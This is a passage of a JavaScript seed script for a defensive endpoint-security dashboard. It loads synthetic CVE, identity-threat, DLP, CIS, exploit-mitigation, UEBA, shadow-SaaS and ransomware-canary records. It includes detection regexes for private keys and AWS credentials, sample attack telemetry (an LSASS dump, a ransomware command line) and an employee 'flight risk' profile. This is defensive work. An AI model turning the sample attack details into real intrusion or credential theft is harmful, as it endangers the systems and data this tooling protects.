      'CVE-2024-30078',
      'Windows Wi-Fi Driver Remote Code Execution Vulnerability',
      'Proximity-based unauthenticated RCE via crafted Wi-Fi network packets processed by the Windows Wi-Fi driver stack.',
      8.8,
      'HIGH',
      'Microsoft',
      'Windows Wi-Fi Driver Stack',
      'KB5039212',
      'POC_EXISTS',
      0.42,
      0
    );

    insertCvc.run(
      'CVE-2023-36884',
      'Microsoft Office and Windows HTML Remote Code Execution Vulnerability (RomCom)',
      'Exploited in targeted attacks via weaponized Office documents to execute arbitrary code with privileges of caller.',
      8.3,
      'HIGH',
      'Microsoft',
      'Microsoft Office 365 ProPlus',
      '16.0.16501.20210',
      'ACTIVE_IN_THE_WILD',
      0.94,
      1
    );

    const devTarget = db.prepare("SELECT id, hostname FROM devices WHERE hostname = 'DESKTOP-R0H12DJ' LIMIT 1").get()
      || db.prepare("SELECT id, hostname FROM devices LIMIT 1").get();

    if (devTarget) {
      const insertEvf = db.prepare(`
        INSERT OR IGNORE INTO endpoint_vulnerability_findings (
          id, device_id, hostname, cve_id, software_component,
          installed_version, fixed_version, remediation_status, detection_date
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', '-3 days'))
      `);

      insertEvf.run(
        'evf-01',
        devTarget.id,
        devTarget.hostname,
        'CVE-2024-38077',
        'Remote Desktop Services',
        '10.0.26100.1150',
        'KB5040442',
        'ACTIVE'
      );

      insertEvf.run(
        'evf-02',
        devTarget.id,
        devTarget.hostname,
        'CVE-2023-36884',
        'Microsoft Office 365 ProPlus',
        '16.0.16327.20248',
        '16.0.16501.20210',
        'PATCH_PENDING'
      );

      const insertVrt = db.prepare(`
        INSERT OR IGNORE INTO vulnerability_remediation_tasks (
          id, cve_id, priority, title, remediation_action,
          impacted_device_count, exposed_user_count, assigned_admin, status, due_date
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'OPEN', DATETIME('now', '+3 days'))
      `);

      insertVrt.run(
        'vrt-01',
        'CVE-2024-38077',
        'CRITICAL',
        'Deploy Cumulative Security Update KB5040442 to Mitigate MadLicense RCE',
        'Apply Windows Security Update KB5040442 and restart host to eliminate unauthenticated RCE risk.',
        3,
        5,
        'SecOps Patch Governance Lead'
      );
    }
  }

  // Iteration 56: Identity Threat Detection & Response Seeds
  const itdrCount = db.prepare('SELECT COUNT(*) as count FROM identity_threat_detections').get().count;
  if (itdrCount === 0) {
    const devTarget = db.prepare('SELECT id, hostname FROM devices LIMIT 1').get() || { id: 'dev-01', hostname: 'DESKTOP-CORP-01' };

    const insertItd = db.prepare(`
      INSERT OR IGNORE INTO identity_threat_detections (
        id, target_account, source_host, source_ip, domain_controller,
        attack_vector, mitre_technique, risk_score, status, raw_evidence_json
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertItd.run(
      'itd-01',
      'svc_sql_reporting',
      devTarget.hostname,
      '192.168.1.145',
      'DC01.LOCALPILOT.CORP',
      'KERBEROASTING',
      'T1558.003',
      88.5,
      'NEW',
      JSON.stringify({ ticket_encryption: 'RC4-HMAC', requested_spn: 'MSSQLSvc/sql01.localpilot.corp:1433', client_process: 'powershell.exe' })
    );

    insertItd.run(
      'itd-02',
      'LOCAL_SYSTEM',
      devTarget.hostname,
      '127.0.0.1',
      'DC01.LOCALPILOT.CORP',
      'LSASS_MEMORY_DUMP',
      'T1003.001',
      95.0,
      'INVESTIGATING',
      JSON.stringify({ dumping_process: 'procdump64.exe', target_process: 'lsass.exe', granted_access: '0x1010', call_trace: 'ntdll.dll!NtOpenProcess' })
    );

    insertItd.run(
      'itd-03',
      'DA_Honeytoken_Alpha',
      devTarget.hostname,
      '192.168.1.200',
      'DC02.LOCALPILOT.CORP',
      'HONEYTOKEN_TRIGGERED',
      'T1078.002',
      99.0,
      'NEW',
      JSON.stringify({ decoy_account: 'DA_Honeytoken_Alpha', trigger_action: 'Interactive Logon Attempt', status_code: '0xC000006A' })
    );

    const insertIhc = db.prepare(`
      INSERT OR IGNORE INTO identity_honeytokens_catalog (
        id, honeytoken_type, account_name, domain_name, spn, planted_on_host, description
      ) VALUES (?, ?, ?, ?, ?, ?, ?)
    `);

    insertIhc.run(
      'ihc-01',
      'DECOY_USER_ACCOUNT',
      'DA_Honeytoken_Alpha',
      'LOCALPILOT.CORP',
      null,
      devTarget.hostname,
      'Decoy Domain Admin account planted in fake AD group to detect lateral reconnaissance'
    );

    insertIhc.run(
      'ihc-02',
      'FAKE_SPN_SERVICE',
      'svc_decoy_backup',
      'LOCALPILOT.CORP',
      'backup/nas01.localpilot.corp',
      devTarget.hostname,
      'Decoy service account with legacy RC4 SPN registered to trap Kerberoasting scanners'
    );

    const insertIars = db.prepare(`
      INSERT OR IGNORE INTO identity_account_risk_scores (
        id, account_name, account_type, department, risk_score, risk_level, anomalous_logon_count, lateral_movement_count
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertIars.run(
      'iars-01',
      'svc_sql_reporting',
      'SERVICE_ACCOUNT',
      'Database Operations',
      88.5,
      'HIGH',
      4,
      1
    );

    insertIars.run(
      'iars-02',
      'Administrator',
      'DOMAIN_ADMIN',
      'IT Infrastructure',
      35.0,
      'LOW',
      0,
      0
    );

    insertIars.run(
      'iars-03',
      'DA_Honeytoken_Alpha',
      'DOMAIN_ADMIN',
      'Security Deception Decoy',
      99.0,
      'CRITICAL',
      1,
      0
    );
  }

  // Iteration 57: Data Loss Prevention & Exfiltration Guardrails Seeds
  const dlpCount = db.prepare('SELECT COUNT(*) as count FROM dlp_classification_rules').get().count;
  if (dlpCount === 0) {
    const devTarget = db.prepare('SELECT id, hostname FROM devices LIMIT 1').get() || { id: 'dev-01', hostname: 'DESKTOP-CORP-01' };

    const insertDcr = db.prepare(`
      INSERT OR IGNORE INTO dlp_classification_rules (
        id, rule_name, category, severity, pattern_regex, confidence_threshold, enforcement_action, is_enabled
      ) VALUES (?, ?, ?, ?, ?, ?, ?, 1)
    `);

    insertDcr.run(
      'dcr-01',
      'PCI-DSS Credit Card Numbers (Visa/Mastercard/Amex)',
      'FINANCIAL_PCI',
      'CRITICAL',
      '\\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\\b',
      95.0,
      'BLOCK'
    );

    insertDcr.run(
      'dcr-02',
      'US Social Security Numbers (SSN)',
      'PERSONAL_PII',
      'HIGH',
      '\\b[0-9]{3}-[0-9]{2}-[0-9]{4}\\b',
      90.0,
      'BLOCK'
    );

    insertDcr.run(
      'dcr-03',
      'RSA & EC Private Key PEM Headers',
      'SECRETS_CREDENTIALS',
      'CRITICAL',
      '-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----',
      99.0,
      'BLOCK'
    );

    insertDcr.run(
      'dcr-04',
      'AWS Cloud Access Key & Secret Pattern',
      'SECRETS_CREDENTIALS',
      'CRITICAL',
      '(?:AKIA|ABIA|ACCA|ASIA)[0-9A-Z]{16}',
      92.0,
      'BLOCK'
    );

    const insertDfsf = db.prepare(`
      INSERT OR IGNORE INTO dlp_file_scan_findings (
        id, device_id, hostname, file_path, file_size_bytes,
        classification_rule_id, rule_name, match_count, sensitivity_severity, remediation_status
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertDfsf.run(
      'dfsf-01',
      devTarget.id,
      devTarget.hostname,
      'C:\\Users\\Admin\\Desktop\\customer_billing_export.csv',
      1048576,
      'dcr-01',
      'PCI-DSS Credit Card Numbers (Visa/Mastercard/Amex)',
      45,
      'CRITICAL',
      'UNENCRYPTED_EXPOSURE'
    );

    insertDfsf.run(
      'dfsf-02',
      devTarget.id,
      devTarget.hostname,
      'C:\\Users\\Admin\\.ssh\\id_rsa_backup',
      3243,
      'dcr-03',
      'RSA & EC Private Key PEM Headers',
      1,
      'CRITICAL',
      'UNENCRYPTED_EXPOSURE'
    );

    const insertDei = db.prepare(`
      INSERT OR IGNORE INTO dlp_exfiltration_incidents (
        id, device_id, hostname, user_account, channel, file_or_data_name,
        rule_id, rule_name, severity, action_taken, raw_event_json
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertDei.run(
      'dei-01',
      devTarget.id,
      devTarget.hostname,
      'jdoe',
      'REMOVABLE_USB',
      'E:\\Confidential\\customer_billing_export.csv',
      'dcr-01',
      'PCI-DSS Credit Card Numbers (Visa/Mastercard/Amex)',
      'CRITICAL',
      'BLOCKED',
      JSON.stringify({ usb_vendor: 'SanDisk Ultra', serial_number: 'SDUSB-884219', bytes_intercepted: 1048576 })
    );

    insertDei.run(
      'dei-02',
      devTarget.id,
      devTarget.hostname,
      'alice',
      'CLIPBOARD_PASTE',
      'Clipboard Paste -> Discord.exe',
      'dcr-04',
      'AWS Cloud Access Key & Secret Pattern',
      'CRITICAL',
      'BLOCKED',
      JSON.stringify({ destination_window: 'Discord', matched_content_preview: 'AKIAIOSFODNN7EXAMPLE' })
    );
  }

  // Iteration 58: Endpoint Configuration Drift & CIS Benchmark Compliance Seeds
  const cisCount = db.prepare('SELECT COUNT(*) as count FROM cis_benchmark_rules').get().count;
  if (cisCount === 0) {
    const devTarget = db.prepare('SELECT id, hostname FROM devices LIMIT 1').get() || { id: 'dev-01', hostname: 'DESKTOP-CORP-01' };

    const insertCbr = db.prepare(`
      INSERT OR IGNORE INTO cis_benchmark_rules (
        id, benchmark_name, section_id, title, description, profile_level, check_type, target_path, target_key, expected_value, remediation_impact
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertCbr.run(
      'cbr-01',
      'CIS_WINDOWS_11_ENTERPRISE',
      '18.9.4.1',
      'Ensure Configure Windows Defender SmartScreen is enabled',
      'Protects endpoints against phishing and malicious software downloads.',
      'LEVEL_1',
      'REGISTRY_VALUE',
      'HKLM:\\Software\\Policies\\Microsoft\\Windows\\System',
      'EnableSmartScreen',
      '1',
      'LOW'
    );

    insertCbr.run(
      'cbr-02',
      'CIS_WINDOWS_11_ENTERPRISE',
      '18.5.11.2',
      'Ensure Turn off Link-Local Multicast Name Resolution (LLMNR) is enabled',
      'Mitigates LLMNR poisoning and NTLM relay attacks.',
      'LEVEL_1',
      'REGISTRY_VALUE',
      'HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient',
      'EnableMulticast',
      '0',
      'LOW'
    );

    insertCbr.run(
      'cbr-03',
      'CIS_WINDOWS_11_ENTERPRISE',
      '2.3.17.2',
      'Ensure User Account Control: Switch to the secure desktop when prompting for elevation is enabled',
      'Prevents background software from simulating keystrokes or tampering with elevation dialogs.',
      'LEVEL_1',
      'REGISTRY_VALUE',
      'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
      'PromptOnSecureDesktop',
      '1',
      'LOW'
    );

    insertCbr.run(
      'cbr-04',
      'CIS_WINDOWS_11_ENTERPRISE',
      '18.9.15.1',
      'Ensure Choose drive encryption method and cipher strength (XTS-AES 256-bit) is enabled',
      'Enforces XTS-AES 256 BitLocker volume encryption across operating system and fixed data drives.',
      'LEVEL_2',
      'REGISTRY_VALUE',
      'HKLM:\\Software\\Policies\\Microsoft\\FVE',
      'EncryptionMethodWithXtsOs',
      '7',
      'MEDIUM'
    );

    const insertCeca = db.prepare(`
      INSERT OR IGNORE INTO cis_endpoint_compliance_audits (
        id, device_id, hostname, benchmark_name, total_rules_evaluated,
        passed_rules_count, failed_rules_count, compliance_score_percent, drift_detected, findings_summary_json
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertCeca.run(
      'ceca-01',
      devTarget.id,
      devTarget.hostname,
      'CIS_WINDOWS_11_ENTERPRISE',
      4,
      3,
      1,
      75.0,
      1,
      JSON.stringify({
        failed_rules: ['cbr-02 (LLMNR Enabled)'],
        passed_rules: ['cbr-01 (SmartScreen)', 'cbr-03 (UAC Secure Desktop)', 'cbr-04 (BitLocker 256)']
      })
    );

    const insertCrrs = db.prepare(`
      INSERT OR IGNORE INTO cis_rule_remediation_scripts (
        id, rule_id, script_type, remediation_code, rollback_code, reboot_required
      ) VALUES (?, ?, ?, ?, ?, ?)
    `);

    insertCrrs.run(
      'crrs-01',
      'cbr-01',
      'POWERSHELL',
      'Set-ItemProperty -Path "HKLM:\\Software\\Policies\\Microsoft\\Windows\\System" -Name "EnableSmartScreen" -Value 1 -Type DWord -Force',
      'Remove-ItemProperty -Path "HKLM:\\Software\\Policies\\Microsoft\\Windows\\System" -Name "EnableSmartScreen" -ErrorAction SilentlyContinue',
      0
    );

    insertCrrs.run(
      'crrs-02',
      'cbr-02',
      'POWERSHELL',
      'if (!(Test-Path "HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient")) { New-Item -Path "HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient" -Force }; Set-ItemProperty -Path "HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient" -Name "EnableMulticast" -Value 0 -Type DWord -Force',
      'Set-ItemProperty -Path "HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient" -Name "EnableMulticast" -Value 1 -Type DWord -Force',
      0
    );
  }

  // Iteration 59: Windows Exploit Protection & Process Mitigation Seeds
  const empCount = db.prepare('SELECT COUNT(*) as count FROM exploit_mitigation_policies').get().count;
  if (empCount === 0) {
    const devTarget = db.prepare('SELECT id, hostname FROM devices LIMIT 1').get() || { id: 'dev-01', hostname: 'DESKTOP-CORP-01' };

    const insertEmp = db.prepare(`
      INSERT OR IGNORE INTO exploit_mitigation_policies (
        id, name, description, target_group, system_dep, system_aslr_bottom_up, system_aslr_force_relocate,
        system_aslr_high_entropy, system_sehop, system_cfg, status
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertEmp.run(
      'emp-01',
      'Enterprise Standard Exploit Guard Baseline',
      'Hardens core memory protections, enforces DEP, High-Entropy ASLR, SEHOP, and CFG across the fleet.',
      'All Corporate Endpoints',
      1, 1, 1, 1, 1, 1, 'ACTIVE'
    );

    insertEmp.run(
      'emp-02',
      'High-Security Developer & Admin Baseline',
      'Strict exploit protections with Arbitrary Code Guard and Code Integrity Guard restrictions for privileged bastion hosts.',
      'Developer Workstations',
      1, 1, 1, 1, 1, 1, 'ACTIVE'
    );

    const insertEam = db.prepare(`
      INSERT OR IGNORE INTO exploit_app_mitigations (
        id, policy_id, executable_name, disallow_child_process_creation, block_remote_image_loads,
        block_low_integrity_images, arbitrary_code_guard, code_integrity_guard, export_address_filter,
        import_address_filter, strict_handle_checks, disable_win32k_system_calls
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertEam.run('eam-01', 'emp-01', 'powershell.exe', 1, 1, 1, 0, 0, 1, 1, 1, 0);
    insertEam.run('eam-02', 'emp-01', 'cmd.exe', 1, 1, 1, 0, 0, 1, 1, 1, 0);
    insertEam.run('eam-03', 'emp-01', 'winword.exe', 1, 1, 1, 0, 0, 1, 1, 1, 1);
    insertEam.run('eam-04', 'emp-01', 'excel.exe', 1, 1, 1, 0, 0, 1, 1, 1, 1);
    insertEam.run('eam-05', 'emp-01', 'chrome.exe', 0, 1, 1, 1, 0, 1, 1, 1, 1);

    const insertEea = db.prepare(`
      INSERT OR IGNORE INTO exploit_endpoint_audits (
        id, device_id, hostname, policy_id, policy_name, system_mitigations_compliant,
        apps_evaluated_count, apps_compliant_count, apps_drifted_count, compliance_score_percent,
        drift_detected, findings_json
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertEea.run(
      'eea-01',
      devTarget.id,
      devTarget.hostname,
      'emp-01',
      'Enterprise Standard Exploit Guard Baseline',
      1,
      5,
      4,
      1,
      80.0,
      1,
      JSON.stringify({
        drifted_apps: ['powershell.exe'],
        drift_reasons: ['powershell.exe: disallow_child_process_creation not enforced in registry']
      })
    );
  }

  // Iteration 60: User & Entity Behavior Analytics (UEBA) Seeds
  const uebaCount = db.prepare('SELECT COUNT(*) as count FROM ueba_risk_indicators').get().count;
  if (uebaCount === 0) {
    const devTarget = db.prepare('SELECT id, hostname FROM devices LIMIT 1').get() || { id: 'dev-01', hostname: 'DESKTOP-CORP-01' };

    const insertUri = db.prepare(`
      INSERT OR IGNORE INTO ueba_risk_indicators (
        id, indicator_name, category, description, risk_weight, threshold_value, severity, is_active
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertUri.run(
      'uri-01',
      'MASS_FILE_EXFILTRATION_SPIKE',
      'DATA_EXFILTRATION',
      'Detects sudden spike in mass file downloads, USB transfers, or cloud uploads exceeding 3x daily baseline.',
      35, 3.0, 'HIGH', 1
    );

    insertUri.run(
      'uri-02',
      'ANOMALOUS_AFTER_HOURS_LOGON',
      'ANOMALOUS_LOGON',
      'Identifies authentication activities between 01:00 and 05:00 from non-standard workstation endpoints.',
      20, 1.0, 'MEDIUM', 1
    );

    insertUri.run(
      'uri-03',
      'PRIVILEGE_CREEP_ABUSE',
      'PRIVILEGE_ABUSE',
      'Flags unauthorized queries to Domain Admin shares or local SAM database access attempts.',
      30, 1.0, 'CRITICAL', 1
    );

    insertUri.run(
      'uri-04',
      'FLIGHT_RISK_DATA_HARVESTING',
      'FLIGHT_RISK',
      'Correlates job board searches with customer CRM database bulk exports prior to potential resignation.',
      25, 2.0, 'HIGH', 1
    );

    const insertUurp = db.prepare(`
      INSERT OR IGNORE INTO ueba_user_risk_profiles (
        id, user_principal, display_name, department, composite_risk_score, risk_level, flight_risk_flag, containment_status, anomalies_count
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertUurp.run(
      'uurp-01',
      'alex.mercer@corp.local',
      'Alex Mercer',
      'Engineering & R&D',
      78,
      'HIGH',
      1,
      'RESTRICTED',
      2
    );

    insertUurp.run(
      'uurp-02',
      'sarah.connor@corp.local',
      'Sarah Connor',
      'SecOps & Cyber Defense',
      15,
      'LOW',
      0,
      'MONITORED',
      0
    );

    const insertUuba = db.prepare(`
      INSERT OR IGNORE INTO ueba_user_behavior_anomalies (
        id, user_principal, device_id, hostname, indicator_id, anomaly_type, observed_value, baseline_value, deviation_score, status, details_json
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertUuba.run(
      'uuba-01',
      'alex.mercer@corp.local',
      devTarget.id,
      devTarget.hostname,
      'uri-01',
      'MASS_FILE_EXFILTRATION_SPIKE',
      1420.0,
      120.0,
      11.8,
      'OPEN',
      JSON.stringify({
        channel: 'REMOVABLE_USB',
        files_transferred: 412,
        target_path: 'E:\\confidential_schematics.zip'
      })
    );
  }

  // Iteration 61: Cloud App Discovery & Shadow SaaS Governance Seeds
  const cacCount = db.prepare('SELECT COUNT(*) as count FROM cloud_app_catalog').get().count;
  if (cacCount === 0) {
    const devTarget = db.prepare('SELECT id, hostname FROM devices LIMIT 1').get() || { id: 'dev-01', hostname: 'DESKTOP-CORP-01' };

    const insertCac = db.prepare(`
      INSERT OR IGNORE INTO cloud_app_catalog (
        id, app_name, category, domain_name, description, risk_score, sanctioned_status,
        compliance_certifications, total_users_count, total_bytes_transferred
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertCac.run(
      'cac-01',
      'ChatGPT / OpenAI',
      'GENERATIVE_AI',
      'chatgpt.com',
      'Public LLM chat portal used for code generation and document analysis.',
      65,
      'MONITORED',
      JSON.stringify(['SOC2', 'GDPR']),
      3,
      14500000
    );

    insertCac.run(
      'cac-02',
      'Mega.nz Cloud Storage',
      'CLOUD_STORAGE',
      'mega.nz',
      'High-risk anonymous encrypted cloud storage locker frequently leveraged for exfiltration.',
      88,
      'UNSANCTIONED',
      JSON.stringify([]),
      1,
      482000000
    );

    insertCac.run(
      'cac-03',
      'Microsoft 365 & OneDrive',
      'CLOUD_STORAGE',
      'onedrive.live.com',
      'Corporate sanctioned enterprise collaboration and cloud drive.',
      10,
      'SANCTIONED',
      JSON.stringify(['SOC2', 'ISO27001', 'HIPAA', 'FedRAMP']),
      8,
      8920000000
    );

    insertCac.run(
      'cac-04',
      'GitHub Enterprise',
      'DEVELOPER_TOOLS',
      'github.com',
      'Centralized code hosting, git repositories, and CI/CD pipelines.',
      15,
      'SANCTIONED',
      JSON.stringify(['SOC2', 'ISO27001']),
      5,
      124000000
    );

    const insertEcut = db.prepare(`
      INSERT OR IGNORE INTO endpoint_cloud_usage_telemetry (
        id, app_id, app_name, device_id, hostname, user_principal, bytes_uploaded, bytes_downloaded, session_count
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertEcut.run(
      'ecut-01',
      'cac-02',
      'Mega.nz Cloud Storage',
      devTarget.id,
      devTarget.hostname,
      'alex.mercer@corp.local',
      450000000,
      32000000,
      4
    );

    const insertCaap = db.prepare(`
      INSERT OR IGNORE INTO cloud_app_access_policies (
        id, name, target_scope, app_id, enforcement_action, is_active
      ) VALUES (?, ?, ?, ?, ?, ?)
    `);

    insertCaap.run(
      'caap-01',
      'Block Unsanctioned Cloud Lockers',
      'ALL_FLEET',
      'cac-02',
      'BLOCK',
      1
    );
  }

  // Iteration 62: Automated Ransomware Canary Files & File Integrity Trap Seeds
  const rctCount = db.prepare('SELECT COUNT(*) as count FROM ransomware_canary_traps').get().count;
  if (rctCount === 0) {
    const devTarget = db.prepare('SELECT id, hostname FROM devices LIMIT 1').get() || { id: 'dev-01', hostname: 'DESKTOP-CORP-01' };

    const insertRct = db.prepare(`
      INSERT OR IGNORE INTO ransomware_canary_traps (
        id, filename, directory_path, original_sha256, original_size_bytes, baseline_entropy, status
      ) VALUES (?, ?, ?, ?, ?, ?, ?)
    `);

    insertRct.run(
      'rct-01',
      'Quarterly_Financial_Statement_2026.xlsx',
      'C:\\Users\\Public\\Documents',
      'a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0',
      8192,
      4.15,
      'HEALTHY'
    );

    insertRct.run(
      'rct-02',
      'Executive_Board_Minutes_Confidential.pdf',
      'C:\\SharedDocs\\Board',
      'f0e1d2c3b4a5968778695a4b3c2d1e0f0123456789abcdef0123456789abcdef',
      12480,
      4.32,
      'HEALTHY'
    );

    insertRct.run(
      'rct-03',
      'Customer_Vault_Keys_Backup.docx',
      'C:\\Users\\Tony\\Desktop',
      'b8c7d6e5f4a3928170615243342516070123456789abcdef0123456789abcdef',
      6144,
      3.89,
      'HEALTHY'
    );

    const insertRtd = db.prepare(`
      INSERT OR IGNORE INTO ransomware_tamper_detections (
        id, trap_id, device_id, hostname, tamper_type, detected_extension,
        process_id, process_name, process_command_line, containment_action, severity, forensic_details_json
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertRtd.run(
      'rtd-01',
      'rct-01',
      devTarget.id,
      devTarget.hostname,
      'EXTENSION_CHANGE',
      '.lockbit',
      4892,
      'vssadmin_bypass.exe',
      'vssadmin_bypass.exe -encrypt C:\\Users\\Public\\Documents',
      'KILL_PROCESS',
      'CRITICAL',
      JSON.stringify({
        entropy_observed: 7.94,
        tamper_speed_ms: 45,
        parent_process: 'cmd.exe'
      })
    );

    const insertRcp = db.prepare(`
      INSERT OR IGNORE INTO ransomware_containment_policies (
        id, name, target_scope, auto_kill_process, auto_isolate_network, auto_restore_canary, entropy_threshold, is_active
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertRcp.run(
      'rcp-01',
      'Zero-Tolerance Automated Ransomware Lockdown',
      'ALL_FLEET',
      1,
      1,
      1,
      7.8,
      1
    );
  }






}

